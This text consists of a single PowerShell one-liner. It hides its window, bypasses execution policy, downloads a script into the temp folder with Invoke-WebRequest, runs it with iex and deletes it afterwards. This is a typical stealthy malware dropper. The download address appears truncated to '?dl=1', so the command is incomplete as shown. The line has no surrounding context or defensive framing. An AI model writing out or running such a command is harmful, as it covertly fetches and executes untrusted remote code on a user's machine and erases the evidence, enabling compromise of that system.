powershell -w h -NoP -NonI -Exec Bypass  "$e=\"$env:TMP/e.ps1\";iwr ?dl=1-O $e;iex $e;rm $e"

